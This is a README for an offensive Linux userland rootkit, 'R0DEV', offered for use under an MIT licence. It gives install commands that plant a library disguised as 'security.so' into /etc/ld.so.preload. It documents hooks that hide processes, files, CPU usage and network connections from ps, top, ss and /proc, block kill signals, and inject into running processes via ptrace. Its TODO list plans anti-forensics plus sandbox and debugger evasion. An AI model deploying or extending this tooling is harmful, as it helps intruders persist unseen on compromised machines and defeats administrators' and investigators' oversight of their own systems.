# R0DEV — Userland LD_PRELOAD Rootkit

Hooks `readdir`, `readdir64`, `stat`, `lstat`, `fstatat`, `open`, `openat`,
`fopen`, `read`, `kill` to hide processes, files, CPU usage, and network
connections on Linux. Runtime injection via `ptrace`.

No LKM. No kernel symbols. No `kprobe`. Works on any kernel with `glibc`.

## Build

```bash
make          # rootkit.so + fix_rootkit + forcekill + injector
make strip    # strip debug info (OPSEC)
make release  # clean + all + strip
make clean
```

## Install

```bash
# System-wide (all new processes)
sudo cp rootkit.so /lib/x86_64-linux-gnu/security.so
echo /lib/x86_64-linux-gnu/security.so | sudo tee /etc/ld.so.preload

# Per-process
LD_PRELOAD=./rootkit.so bash
```

## Usage

Run any binary with the prefix in its name:

```bash
exec -a R0Dev_binary /path/to/binary
```

The process will be hidden from `ps`, `ls /proc/`, `top`, `ss`/`netstat`.
Protected from SIGKILL/SIGTERM. CPU usage subtracted from `/proc/stat`.

Runtime injection into a running process:

```bash
sudo ./injector <pid> ./rootkit.so
```

Remove:

```bash
sudo ./fix_rootkit
```

## Configuration

| Variable | Default | Description |
|---|---|---|
| `R0DEV_PREFIX` | `r0dev` | Case-insensitive prefix for hide/kill protection |

## Hooks

| Function | What it hooks | Effect |
|---|---|---|
| `readdir()` / `readdir64()` | `/proc` listing | Hides PID dirs + files matching prefix |
| `stat()` / `lstat()` / `fstatat()` | File metadata | Hides files matching prefix (`ENOENT`) |
| `open()` / `openat()` | File open | `/proc/stat` → memfd with CPU subtracted |
| | | `/proc/net/tcp` → memfd with hidden connections removed |
| `fopen()` | File open (stdio) | Same as `open()` for both `/proc/stat` and `/proc/net/tcp` |
| `read()` | Any fd | Modifies in-flight buffers for `/proc/stat`, `/proc/net/tcp` |
| `kill()` | Signal delivery | Blocks SIGKILL/SIGTERM to hidden processes |

### Connection hiding detail

When `/proc/net/tcp`, `/proc/net/tcp6`, or `/proc/net/udp` is read:

1. Scans `/proc/` for hidden PIDs (matching prefix)
2. For each hidden PID, reads `/proc/PID/fd/` to find socket inodes
3. Compares against inode column (10th field) in `/proc/net/tcp`
4. Lines matching hidden sockets are removed
5. Returns a memory-backed fd (`memfd`) or `FILE*` with filtered content

Uses raw syscalls internally to bypass its own hooks during inode
discovery.

## Architecture

```
                   Any Process
       ┌──────────────────────────────────────┐
       │             libc (glibc)              │
       │  open() ──→ dlsym(RTLD_NEXT)          │
       │             ↓                         │
       │         security.so (hook)            │
       │  has_prefix() ? → modify/return       │
       │              : → pass-through         │
       └──────────────────────────────────────┘
                        ↕ LD_PRELOAD
```

## TODO

- [ ] **Injector stabilization** — ptrace injection fails on
  multi-threaded processes. Use `process_vm_writev` + `dlopen` via
  remote thread instead.

- [ ] **`connect()` hook** — Block outbound connections from hidden
  processes at the socket layer (defense-in-depth).

- [ ] **`uname()` hook** — Spoof kernel version string for
  anti-forensics.

- [ ] **`statx()` hook** — Modern `stat` syscall wrapper
  (Linux 4.11+).

- [ ] **Randomized prefix** — Generate unique prefix at install time
  instead of hardcoded `r0dev`.

- [ ] **Config file** — Replace env var with `/etc/r0dev.conf` for
  silent configuration.

- [ ] **ARM64 build** — Cross-compile support for aarch64.

- [ ] **Sandbox detection** — Skip hooks under `strace`, `gdb`,
  virtualized environments.

- [ ] **Self-cleaning on crash** — If rootkit.so is removed without
  running `fix_rootkit`, `ld.so.preload` still points to a missing
  file; all processes hang on load. Add fail-safe.

## License

MIT
